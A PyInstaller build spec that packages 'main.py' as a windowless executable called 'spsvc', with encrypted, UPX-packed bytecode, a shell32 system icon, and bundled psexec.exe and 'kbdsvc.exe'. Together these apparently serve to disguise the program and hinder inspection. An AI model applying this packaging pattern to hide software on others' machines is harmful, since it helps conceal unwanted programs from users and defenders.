# -*- mode: python -*-

import string
import random


def key_generator(size=16, chars=string.printable):
    return ''.join(random.choice(chars) for _ in range(size))


block_cipher = pyi_crypto.PyiBlockCipher(key=key_generator())
# block_cipher=None

added_files = [
    ('setup.bat', '.'),
    ('psexec.exe', '.'),
    ('requests/ca.crt', 'requests'),
    ('kbdsvc/kbdsvc.exe', 'kbdsvc'),
]

a = Analysis(['main.py'],
             pathex=['d:\\python\\workspaces\\spclient'],
             binaries=[('c:\\Windows\\System32\\msvcr100.dll', '.')],
             datas=added_files,
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
          cipher=block_cipher)
exe = EXE(pyz,
          a.scripts + [('O', '', 'OPTION')],
          icon='shell32.dll,2',
          exclude_binaries=True,
          name='spsvc',
          debug=False,
          strip=False,
          upx=True,
          console=False)
coll = COLLECT(exe,
               a.binaries,
               a.zipfiles,
               a.datas,
               strip=False,
               upx=True,
               name='spsvc')
